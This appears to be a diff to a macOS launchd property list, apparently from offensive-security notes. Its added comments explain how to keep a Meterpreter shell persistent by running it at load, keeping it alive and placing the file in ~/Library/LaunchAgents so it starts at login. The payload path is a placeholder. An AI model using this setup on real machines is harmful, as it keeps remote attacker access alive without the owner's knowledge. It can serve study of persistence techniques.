@@ -6,11 +6,18 @@
 		<string>com.example.shell</string>
 		<key>Program</key>
 		<string>/path/to/the/file</string>
+		<!-- Execute the file when this plist file is loaded -->
 		<key>RunAtLoad</key>
 		<true/>
+		<!-- Keep the shell alive when there is network connection  -->
 		<key>KeepAlive</key>
 		<true/>
 		<key>WorkingDirectory</key>
+		<!-- Files in /var/tmp survives reboot -->
 		<string>/var/tmp</string>
 	</dict>
 </plist>
+
+
+<!-- Store under ~/Library/LaunchAgents so the metepreter start when the user login -->
+
